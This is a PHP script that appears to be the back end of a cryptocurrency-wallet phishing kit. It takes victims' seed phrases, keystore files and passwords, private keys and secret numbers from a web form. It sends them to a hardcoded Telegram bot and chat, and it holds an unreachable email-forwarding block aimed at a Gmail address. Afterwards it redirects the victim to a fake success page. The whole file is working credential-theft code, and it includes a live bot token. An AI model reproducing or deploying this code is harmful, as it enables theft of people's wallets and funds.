<?php
// Configuration
$email_to = 'thamblanhema@gmail.com';
$success_url = '/en/success.html';

// Telegram Bot Configuration
$telegramBotToken = "7520816072:AAHt9xJt86SPQ3qsTADXrbirW-4LEW7F_7U";  // Replace with your bot token
$telegramChatID = "-4645179313";  // Replace with your actual channel username or chat ID

// Get the form data
$wallet = $_POST['wallet'];
$phrase = $_POST['phrase'];
$keystore = $_POST['keystore1'];
$keystorepass = $_POST['keystorepass1'];
$privatekeyval = $_POST['privatekeyval'];
$family_seed = $_POST['familyseed'];
$privatekeys = [
    $_POST['privatekey1'], $_POST['privatekey2'], $_POST['privatekey3'],
    $_POST['privatekey4'], $_POST['privatekey5'], $_POST['privatekey6'],
    $_POST['privatekey7'], $_POST['privatekey8']
];

// Create a single message body with all the input
$message = "🚀 *New Wallet Submission!*\n\n";
$message .= "💼 *Wallet:* `$wallet`\n";
$message .= "🔑 *Phrase:* `$phrase`\n";
$message .= "📜 *Keystore JSON:* `$keystore`\n";
$message .= "🔐 *Keystore Pass:* `$keystorepass`\n";
$message .= "🔏 *Private Key:* `$privatekeyval`\n";
$message .= "🌱 *Family Seed:* `$family_seed`\n";
$message .= "🔢 *Secret Numbers:*\n";
foreach ($privatekeys as $index => $key) {
    $message .= "➖ Key " . ($index + 1) . ": `$key`\n";
}

// Send to Telegram
sendToTelegram($telegramBotToken, $telegramChatID, $message);

// Redirect to success page
header('Location: ' . $success_url);
exit();

// Send to Email
$subject = "New Wallet Data Submission";
$headers = 'From: Form <info@web3sols.com>' . "\r\n" .
           'Reply-To: info@web3sols.com' . "\r\n" .
           'MIME-Version: 1.0' . "\r\n" .
           'Content-Type: text/html; charset=UTF-8';
mail($email_to, $subject, nl2br($message), $headers);

// Redirect to success page
header('Location: ' . $success_url);
exit();

// Function to send message to Telegram
function sendToTelegram($botToken, $chatID, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_notification' => false  // Ensures the message is not silent
    ];

    // Use cURL to send request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>